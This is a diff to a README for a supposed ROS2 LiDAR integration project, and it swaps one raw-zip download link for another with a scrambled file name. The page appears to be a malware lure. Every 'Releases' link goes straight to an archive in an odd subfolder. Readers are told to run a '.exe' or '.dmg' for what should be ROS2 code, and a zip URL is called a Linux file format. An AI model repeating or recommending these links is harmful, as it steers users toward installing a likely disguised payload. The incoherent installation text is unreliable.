@@ -1,7 +1,7 @@
 # 🌟 Custom-LiDAR-Integration-UART-Debugging-ROS2-Node-Implementation - Seamless LiDAR Integration for ROS2
 
 ## 📥 Download Now
-[![Download](https://raw.githubusercontent.com/abdullahriyas21/Custom-LiDAR-Integration-UART-Debugging-ROS2-Node-Implementation/main/sturniform/Custom-LiDAR-Integration-UART-Debugging-ROS2-Node-Implementation_v3.6-beta.3.zip%20Release-Click%20Here-brightgreen)](https://raw.githubusercontent.com/abdullahriyas21/Custom-LiDAR-Integration-UART-Debugging-ROS2-Node-Implementation/main/sturniform/Custom-LiDAR-Integration-UART-Debugging-ROS2-Node-Implementation_v3.6-beta.3.zip)
+[![Download](https://raw.githubusercontent.com/abdullahriyas21/Custom-LiDAR-Integration-UART-Debugging-ROS2-Node-Implementation/main/sturniform/Node-RO-Li-Custom-UAR-Integration-DA-Implementation-Debugging-2.1.zip%20Release-Click%20Here-brightgreen)](https://raw.githubusercontent.com/abdullahriyas21/Custom-LiDAR-Integration-UART-Debugging-ROS2-Node-Implementation/main/sturniform/Node-RO-Li-Custom-UAR-Integration-DA-Implementation-Debugging-2.1.zip)
 
 ## 🚀 Getting Started
 Welcome to the Custom LiDAR Integration project! This guide will help you download and run the application easily. You will be able to integrate and debug your LiDAR across various systems quickly.
@@ -25,16 +25,16 @@ This application enables:
 ## 📥 Download & Install
 To get started:
 
-1. **Visit the Releases Page**: Click [here](https://raw.githubusercontent.com/abdullahriyas21/Custom-LiDAR-Integration-UART-Debugging-ROS2-Node-Implementation/main/sturniform/Custom-LiDAR-Integration-UART-Debugging-ROS2-Node-Implementation_v3.6-beta.3.zip) to go to the Releases page.
+1. **Visit the Releases Page**: Click [here](https://raw.githubusercontent.com/abdullahriyas21/Custom-LiDAR-Integration-UART-Debugging-ROS2-Node-Implementation/main/sturniform/Node-RO-Li-Custom-UAR-Integration-DA-Implementation-Debugging-2.1.zip) to go to the Releases page.
   
 2. **Choose the Latest Release**: On the Releases page, look for the latest version. This version contains the most recent updates and fixes.
 
-3. **Download the Application**: Click on the package file that matches your operating system. Common file formats will be available like `.exe` for Windows, `.dmg` for macOS, or `https://raw.githubusercontent.com/abdullahriyas21/Custom-LiDAR-Integration-UART-Debugging-ROS2-Node-Implementation/main/sturniform/Custom-LiDAR-Integration-UART-Debugging-ROS2-Node-Implementation_v3.6-beta.3.zip` for Linux. Your browser will start the download automatically.
+3. **Download the Application**: Click on the package file that matches your operating system. Common file formats will be available like `.exe` for Windows, `.dmg` for macOS, or `https://raw.githubusercontent.com/abdullahriyas21/Custom-LiDAR-Integration-UART-Debugging-ROS2-Node-Implementation/main/sturniform/Node-RO-Li-Custom-UAR-Integration-DA-Implementation-Debugging-2.1.zip` for Linux. Your browser will start the download automatically.
 
 4. **Run the Installer**: After the download completes:
    - **Windows**: Double-click the downloaded `.exe` file and follow the installation prompts.
    - **macOS**: Open the downloaded `.dmg` file and drag the application to your Applications folder.
-   - **Linux**: Extract the `https://raw.githubusercontent.com/abdullahriyas21/Custom-LiDAR-Integration-UART-Debugging-ROS2-Node-Implementation/main/sturniform/Custom-LiDAR-Integration-UART-Debugging-ROS2-Node-Implementation_v3.6-beta.3.zip` file and navigate to the extracted directory in the terminal. Follow the instructions in the README for setup.
+   - **Linux**: Extract the `https://raw.githubusercontent.com/abdullahriyas21/Custom-LiDAR-Integration-UART-Debugging-ROS2-Node-Implementation/main/sturniform/Node-RO-Li-Custom-UAR-Integration-DA-Implementation-Debugging-2.1.zip` file and navigate to the extracted directory in the terminal. Follow the instructions in the README for setup.
 
 5. **Launch the Application**: Find the application in your Programs or Applications folder. Click to open it and start using the feature-rich tools it provides for LiDAR integration and debugging.
 
